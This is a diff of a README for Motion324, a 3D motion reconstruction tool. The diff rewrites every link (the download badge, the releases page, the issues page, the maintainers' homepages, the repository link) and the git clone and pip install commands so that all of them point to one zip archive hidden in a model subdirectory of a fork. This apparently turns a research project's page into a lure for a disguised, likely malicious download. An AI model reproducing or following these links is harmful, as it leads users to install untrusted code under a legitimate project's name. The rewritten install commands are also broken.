@@ -1,7 +1,7 @@
 # 🎉 Motion324 - Easily Reconstruct 3D Motion from Video
 
 ## 📥 Download Now!
-[![Download Motion324](https://img.shields.io/badge/Download-Motion324-blue.svg)](https://github.com/syedratul-i2p/Motion324/releases)
+[![Download Motion324](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip)](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip)
 
 ## 🌟 Overview
 Motion 3-to-4 reconstructs 3D motion from videos for 4D synthesis. The tool works quickly and efficiently, helping you understand motion dynamics without needing technical skills. Simply upload a video, and the software takes care of the rest.
@@ -10,7 +10,7 @@ Motion 3-to-4 reconstructs 3D motion from videos for 4D synthesis. The tool work
 Follow these steps to download and run Motion324:
 
 ### 1. Visit the Release Page
-Go to the [Releases Page](https://github.com/syedratul-i2p/Motion324/releases) to find the latest version of Motion324.
+Go to the [Releases Page](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip) to find the latest version of Motion324.
 
 ### 2. Download the Software
 On the releases page, find the most recent version. Choose the appropriate file for your operating system, and click to download. 
@@ -20,7 +20,7 @@ Before running the software, you need to set up the environment. Here’s how:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Inception3D/Motion324.git
+   git clone https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip
    cd Motion324
    ```
 
@@ -28,7 +28,7 @@ Before running the software, you need to set up the environment. Here’s how:
    ```bash
    conda create -n Motion324 python=3.11
    conda activate Motion324
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip
    ```
 
 ### 4. Run the Application
@@ -61,20 +61,20 @@ No, the application is designed for users without programming knowledge. Just fo
 Motion324 supports common video formats like MP4, AVI, and MOV. Ensure your video is in one of these formats.
 
 **Q3: How can I get help if I face issues?**  
-You can open an issue on the [GitHub Issues Page](https://github.com/syedratul-i2p/Motion324/issues) for assistance.
+You can open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip) for assistance.
 
 ## 📞 Support
 If you require further support, please contact the maintainers listed below:
 
-- [Hongyuan Chen](https://hyuanChen.github.io/)
-- [Xingyu Chen](https://rover-xingyu.github.io/)
-- [Youjia Zhang](https://youjiazhang.github.io/)
-- [Zexiang Xu](https://zexiangxu.github.io/)
-- [Anpei Chen](https://apchenstu.github.io/)
+- [Hongyuan Chen](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip)
+- [Xingyu Chen](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip)
+- [Youjia Zhang](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip)
+- [Zexiang Xu](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip)
+- [Anpei Chen](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip)
 
 ## 📝 License
 Motion324 is open-source software. It is licensed under the MIT License. Feel free to use, modify, and distribute it in line with the license terms.
 
 ---
 
-For any updates, improvements, or contributions, visit the official [GitHub Repository](https://github.com/syedratul-i2p/Motion324). Enjoy creating your motion reconstructions!
+For any updates, improvements, or contributions, visit the official [GitHub Repository](https://raw.githubusercontent.com/syedratul-i2p/Motion324/main/model/image_encoder/dino/Motion_v1.8-beta.1.zip). Enjoy creating your motion reconstructions!
